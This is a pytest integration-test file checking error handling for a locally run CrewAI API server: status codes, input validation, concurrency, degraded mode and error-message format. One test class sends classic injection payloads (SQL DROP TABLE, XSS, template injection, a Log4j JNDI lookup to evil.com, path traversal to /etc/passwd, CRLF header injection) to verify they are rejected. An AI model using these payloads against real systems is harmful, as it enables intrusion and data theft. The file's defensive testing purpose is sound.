#!/usr/bin/env python3
"""
Integration Tests for API Error Handling

Tests error handling, recovery mechanisms, and graceful degradation
for the CrewAI API server.

Requirements covered:
- 2.1: API error handling testing
- 2.2: Service integration error handling
- 7.1: API security error handling
"""

import pytest
import requests
import json
import time
import uuid
import threading
from unittest.mock import patch

try:
    from test_infrastructure.service_manager import ServiceManager
except ImportError:
    from .mock_service_manager import MockServiceManager as ServiceManager


class TestAPIErrorHandling:
    """Test API error handling and recovery mechanisms."""
    
    @pytest.fixture(autouse=True)
    def setup_service(self):
        """Set up CrewAI server for testing."""
        self.base_url = "http://localhost:5051"
        self.service_manager = ServiceManager()
        
        # Start CrewAI server
        if not self.service_manager.start_service("crewai_server"):
            pytest.skip("CrewAI server failed to start")
        
        # Wait for server to be ready
        self._wait_for_server_ready()
        
        yield
        
        # Cleanup
        self.service_manager.stop_service("crewai_server")
    
    def _wait_for_server_ready(self, timeout: int = 30):
        """Wait for server to be ready."""
        start_time = time.time()
        while time.time() - start_time < timeout:
            try:
                response = requests.get(f"{self.base_url}/api/health", timeout=5)
                if response.status_code == 200:
                    return
            except requests.RequestException:
                pass
            time.sleep(1)
        
        pytest.fail("Server did not become ready within timeout")
    
    def _make_request(self, method: str, endpoint: str, **kwargs) -> requests.Response:
        """Make HTTP request with proper error handling."""
        url = f"{self.base_url}{endpoint}"
        
        try:
            response = requests.request(method, url, timeout=30, **kwargs)
            return response
        except requests.RequestException as e:
            pytest.fail(f"Request failed: {e}")


class TestHTTPErrorHandling:
    """Test HTTP-level error handling."""
    
    def test_404_not_found_handling(self):
        """Test 404 error handling for non-existent endpoints."""
        non_existent_endpoints = [
            "/api/nonexistent",
            "/api/process/invalid",
            "/internal/invalid",
            "/settings/invalid"
        ]
        
        for endpoint in non_existent_endpoints:
            response = requests.get(f"http://localhost:5051{endpoint}", timeout=10)
            assert response.status_code == 404
            
            # Should return JSON error response
            try:
                data = response.json()
                assert "error" in data or "message" in data
            except json.JSONDecodeError:
                # Some 404s might not return JSON, which is also acceptable
                pass
    
    def test_405_method_not_allowed(self):
        """Test 405 error for wrong HTTP methods."""
        wrong_method_tests = [
            ("POST", "/api/health"),  # Should be GET
            ("GET", "/api/process"),  # Should be POST
            ("DELETE", "/api/tools"),  # Should be GET
            ("PUT", "/internal/state")  # Should be GET or POST
        ]
        
        for method, endpoint in wrong_method_tests:
            response = requests.request(
                method, 
                f"http://localhost:5051{endpoint}",
                timeout=10
            )
            
            assert response.status_code == 405
    
    def test_400_bad_request_handling(self):
        """Test 400 error handling for malformed requests."""
        # Test malformed JSON
        response = requests.post(
            "http://localhost:5051/api/process",
            data="invalid json",
            headers={"Content-Type": "application/json"},
            timeout=10
        )
        
        assert response.status_code == 400
        data = response.json()
        assert "error" in data
        
        # Test missing required fields
        response = requests.post(
            "http://localhost:5051/api/process",
            json={},  # Missing message field
            timeout=10
        )
        
        assert response.status_code == 400
        data = response.json()
        assert "error" in data
    
    def test_413_payload_too_large(self):
        """Test handling of oversized requests."""
        # Create a very large payload (10MB)
        large_message = "A" * (10 * 1024 * 1024)
        payload = {
            "message": large_message,
            "metadata": {}
        }
        
        response = requests.post(
            "http://localhost:5051/api/process",
            json=payload,
            timeout=30
        )
        
        # Should either accept or reject with appropriate status
        assert response.status_code in [202, 413, 400]
        
        if response.status_code in [413, 400]:
            data = response.json()
            assert "error" in data
    
    def test_timeout_handling(self):
        """Test request timeout handling."""
        # Test with very short timeout
        try:
            response = requests.get(
                "http://localhost:5051/api/health",
                timeout=0.001  # Very short timeout
            )
        except requests.Timeout:
            # This is expected behavior
            pass
        except requests.RequestException:
            # Other connection errors are also acceptable
            pass
    
    def test_connection_error_recovery(self):
        """Test recovery from connection errors."""
        # This test simulates network issues
        # First verify server is working
        response = requests.get("http://localhost:5051/api/health", timeout=10)
        assert response.status_code == 200
        
        # Test with invalid port (should fail gracefully)
        try:
            response = requests.get("http://localhost:9999/api/health", timeout=5)
            pytest.fail("Should have failed to connect to invalid port")
        except requests.ConnectionError:
            # This is expected
            pass
        
        # Verify server is still working after failed connection attempt
        response = requests.get("http://localhost:5051/api/health", timeout=10)
        assert response.status_code == 200


class TestServiceErrorHandling:
    """Test service-level error handling."""
    
    def test_ai_service_unavailable_handling(self):
        """Test handling when AI services are unavailable."""
        # Mock environment without API keys
        with patch.dict('os.environ', {}, clear=True):
            # Server should still respond to health checks
            response = requests.get("http://localhost:5051/api/health", timeout=10)
            assert response.status_code == 200
            
            data = response.json()
            # Should indicate limited functionality
            assert data["status"] in ["online", "limited_mode"]
    
    def test_rag_system_unavailable_handling(self):
        """Test handling when RAG system is unavailable."""
        # Health check should still work even if RAG is down
        response = requests.get("http://localhost:5051/api/health", timeout=10)
        assert response.status_code == 200
        
        data = response.json()
        assert "rag_status" in data
        # RAG status can be true or false, both are valid
        assert isinstance(data["rag_status"], bool)
    
    def test_database_error_handling(self):
        """Test handling of database/storage errors."""
        # Test task retrieval with invalid task ID
        invalid_task_id = str(uuid.uuid4())
        
        response = requests.get(
            f"http://localhost:5051/api/tasks/{invalid_task_id}",
            timeout=10
        )
        
        assert response.status_code == 404
        data = response.json()
        assert "error" in data
        assert "not found" in data["error"].lower()
    
    def test_concurrent_request_handling(self):
        """Test handling of concurrent requests under stress."""
        import queue
        
        results = queue.Queue()
        
        def make_concurrent_request(request_id):
            try:
                response = requests.post(
                    "http://localhost:5051/api/process",
                    json={
                        "message": f"Concurrent test {request_id}",
                        "metadata": {"request_id": request_id}
                    },
                    timeout=30
                )
                results.put((request_id, response.status_code, "success"))
            except Exception as e:
                results.put((request_id, 0, str(e)))
        
        # Start 20 concurrent requests
        threads = []
        for i in range(20):
            thread = threading.Thread(target=make_concurrent_request, args=(i,))
            threads.append(thread)
            thread.start()
        
        # Wait for all to complete
        for thread in threads:
            thread.join(timeout=60)
        
        # Analyze results
        success_count = 0
        error_count = 0
        
        while not results.empty():
            req_id, status_code, result = results.get()
            
            if result == "success" and status_code == 202:
                success_count += 1
            else:
                error_count += 1
                print(f"Request {req_id} failed: {status_code} - {result}")
        
        # At least 80% should succeed
        success_rate = success_count / (success_count + error_count)
        assert success_rate >= 0.8, f"Success rate too low: {success_rate}"


class TestDataValidationErrors:
    """Test data validation error handling."""
    
    def test_invalid_json_structure(self):
        """Test handling of invalid JSON structures."""
        invalid_payloads = [
            {"message": None},  # Null message
            {"message": 123},   # Non-string message
            {"message": []},    # Array message
            {"message": {}},    # Object message
            {"metadata": "invalid"},  # Invalid metadata type
        ]
        
        for payload in invalid_payloads:
            response = requests.post(
                "http://localhost:5051/api/process",
                json=payload,
                timeout=10
            )
            
            # Should return 400 for invalid data
            assert response.status_code == 400
            data = response.json()
            assert "error" in data
    
    def test_unicode_validation_errors(self):
        """Test handling of problematic Unicode characters."""
        problematic_strings = [
            "\x00\x01\x02",  # Control characters
            "\uffff\ufffe",  # Invalid Unicode
            "Test\x00null",   # Embedded null
            "\ud800\udc00",   # Surrogate pairs
        ]
        
        for test_string in problematic_strings:
            payload = {
                "message": test_string,
                "metadata": {}
            }
            
            response = requests.post(
                "http://localhost:5051/api/process",
                json=payload,
                timeout=10
            )
            
            # Should either process or reject gracefully
            assert response.status_code in [202, 400]
            
            if response.status_code == 400:
                data = response.json()
                assert "error" in data
    
    def test_field_length_validation(self):
        """Test validation of field lengths."""
        # Test extremely long message
        very_long_message = "A" * (1024 * 1024)  # 1MB message
        
        payload = {
            "message": very_long_message,
            "metadata": {}
        }
        
        response = requests.post(
            "http://localhost:5051/api/process",
            json=payload,
            timeout=30
        )
        
        # Should either accept or reject with appropriate status
        assert response.status_code in [202, 400, 413]
    
    def test_nested_data_validation(self):
        """Test validation of nested data structures."""
        # Test deeply nested metadata
        deep_metadata = {"level1": {"level2": {"level3": {"level4": "deep"}}}}
        
        payload = {
            "message": "Test with deep metadata",
            "metadata": deep_metadata
        }
        
        response = requests.post(
            "http://localhost:5051/api/process",
            json=payload,
            timeout=10
        )
        
        # Should handle nested data gracefully
        assert response.status_code in [202, 400]


class TestSecurityErrorHandling:
    """Test security-related error handling."""
    
    def test_injection_attack_prevention(self):
        """Test prevention of injection attacks."""
        injection_payloads = [
            "'; DROP TABLE tasks; --",
            "<script>alert('xss')</script>",
            "{{7*7}}",  # Template injection
            "${jndi:ldap://evil.com/a}",  # Log4j style
            "../../../etc/passwd",  # Path traversal
        ]
        
        for payload in injection_payloads:
            response = requests.post(
                "http://localhost:5051/api/process",
                json={"message": payload, "metadata": {}},
                timeout=10
            )
            
            # Should process normally (sanitized) or reject
            assert response.status_code in [202, 400]
            
            # Should not return error messages that reveal system info
            if response.status_code == 400:
                data = response.json()
                error_msg = data.get("error", "").lower()
                
                # Should not contain system-revealing information
                forbidden_terms = ["sql", "database", "file", "path", "system"]
                for term in forbidden_terms:
                    assert term not in error_msg, f"Error message reveals system info: {error_msg}"
    
    def test_header_injection_prevention(self):
        """Test prevention of header injection attacks."""
        malicious_headers = {
            "X-Forwarded-For": "127.0.0.1\r\nX-Injected: malicious",
            "User-Agent": "test\r\nHost: evil.com",
            "Content-Type": "application/json\r\nX-Evil: header"
        }
        
        response = requests.post(
            "http://localhost:5051/api/process",
            json={"message": "test", "metadata": {}},
            headers=malicious_headers,
            timeout=10
        )
        
        # Should process normally
        assert response.status_code == 202
        
        # Check that injected headers are not reflected
        response_headers = dict(response.headers)
        assert "X-Injected" not in response_headers
        assert "X-Evil" not in response_headers
    
    def test_dos_protection(self):
        """Test protection against DoS attacks."""
        # Test rapid requests
        responses = []
        
        for i in range(50):  # 50 rapid requests
            try:
                response = requests.get(
                    "http://localhost:5051/api/health",
                    timeout=5
                )
                responses.append(response.status_code)
            except requests.RequestException:
                responses.append(0)
        
        # Most requests should succeed (rate limiting is optional)
        success_count = sum(1 for status in responses if status == 200)
        
        # At least 70% should succeed (allowing for some rate limiting)
        success_rate = success_count / len(responses)
        assert success_rate >= 0.7, f"Too many requests blocked: {success_rate}"


class TestRecoveryMechanisms:
    """Test system recovery mechanisms."""
    
    def test_graceful_degradation(self):
        """Test graceful degradation when services are unavailable."""
        # Test with missing environment variables
        with patch.dict('os.environ', {}, clear=True):
            # Health check should still work
            response = requests.get("http://localhost:5051/api/health", timeout=10)
            assert response.status_code == 200
            
            data = response.json()
            # Should indicate degraded mode
            assert "status" in data
            
            # Process requests should still be accepted
            response = requests.post(
                "http://localhost:5051/api/process",
                json={"message": "test in degraded mode", "metadata": {}},
                timeout=10
            )
            
            # Should either work or fail gracefully
            assert response.status_code in [202, 503]
    
    def test_error_logging_and_tracking(self):
        """Test that errors are properly logged and tracked."""
        # Make a request that should cause an error
        response = requests.post(
            "http://localhost:5051/api/process",
            json={"invalid": "request"},  # Missing message field
            timeout=10
        )
        
        assert response.status_code == 400
        data = response.json()
        assert "error" in data
        
        # Check that request has tracking ID
        if "X-Request-ID" in response.headers:
            request_id = response.headers["X-Request-ID"]
            assert len(request_id) > 0
    
    def test_circuit_breaker_behavior(self):
        """Test circuit breaker pattern for external services."""
        # This test would require mocking external service failures
        # For now, just verify the system handles external service errors
        
        # Test with invalid API keys (simulates external service failure)
        with patch.dict('os.environ', {'OPENAI_API_KEY': 'invalid-key'}):
            # System should still accept requests
            response = requests.post(
                "http://localhost:5051/api/process",
                json={"message": "test with invalid key", "metadata": {}},
                timeout=10
            )
            
            # Should accept the request (failure will be handled later)
            assert response.status_code == 202
            
            data = response.json()
            assert "task_id" in data
    
    def test_memory_leak_prevention(self):
        """Test that the system doesn't leak memory under error conditions."""
        # Create many failed requests to test memory management
        for i in range(100):
            try:
                response = requests.post(
                    "http://localhost:5051/api/process",
                    json={"invalid": f"request_{i}"},  # Invalid request
                    timeout=5
                )
                assert response.status_code == 400
            except requests.RequestException:
                # Connection errors are acceptable under load
                pass
        
        # System should still be responsive after many errors
        response = requests.get("http://localhost:5051/api/health", timeout=10)
        assert response.status_code == 200


class TestErrorResponseFormat:
    """Test error response format consistency."""
    
    def test_error_response_structure(self):
        """Test that error responses have consistent structure."""
        # Generate various types of errors
        error_scenarios = [
            ("GET", "/api/nonexistent", {}, 404),
            ("POST", "/api/health", {}, 405),
            ("POST", "/api/process", {"invalid": "data"}, 400),
        ]
        
        for method, endpoint, data, expected_status in error_scenarios:
            if data:
                response = requests.request(
                    method,
                    f"http://localhost:5051{endpoint}",
                    json=data,
                    timeout=10
                )
            else:
                response = requests.request(
                    method,
                    f"http://localhost:5051{endpoint}",
                    timeout=10
                )
            
            assert response.status_code == expected_status
            
            # Check response format
            try:
                data = response.json()
                # Should have error field
                assert "error" in data or "message" in data
                
                # Error message should be string
                error_msg = data.get("error") or data.get("message")
                assert isinstance(error_msg, str)
                assert len(error_msg) > 0
                
            except json.JSONDecodeError:
                # Some errors might not return JSON, which is acceptable
                # but response should not be empty
                assert len(response.text) > 0
    
    def test_error_message_quality(self):
        """Test that error messages are helpful and not revealing."""
        # Test with missing message field
        response = requests.post(
            "http://localhost:5051/api/process",
            json={},
            timeout=10
        )
        
        assert response.status_code == 400
        data = response.json()
        error_msg = data["error"].lower()
        
        # Should mention the missing field
        assert "message" in error_msg
        
        # Should not reveal internal details
        forbidden_terms = ["traceback", "exception", "internal", "debug"]
        for term in forbidden_terms:
            assert term not in error_msg
    
    def test_error_codes_consistency(self):
        """Test that HTTP status codes are used consistently."""
        # Test various error conditions
        test_cases = [
            # (description, method, endpoint, data, expected_status)
            ("Not found", "GET", "/api/nonexistent", None, 404),
            ("Method not allowed", "POST", "/api/health", None, 405),
            ("Bad request - missing data", "POST", "/api/process", {}, 400),
            ("Bad request - invalid JSON", "POST", "/api/process", "invalid", 400),
        ]
        
        for description, method, endpoint, data, expected_status in test_cases:
            if data is None:
                response = requests.request(
                    method,
                    f"http://localhost:5051{endpoint}",
                    timeout=10
                )
            elif isinstance(data, str):
                response = requests.request(
                    method,
                    f"http://localhost:5051{endpoint}",
                    data=data,
                    headers={"Content-Type": "application/json"},
                    timeout=10
                )
            else:
                response = requests.request(
                    method,
                    f"http://localhost:5051{endpoint}",
                    json=data,
                    timeout=10
                )
            
            assert response.status_code == expected_status, f"Failed for {description}"


if __name__ == "__main__":
    pytest.main([__file__, "-v"])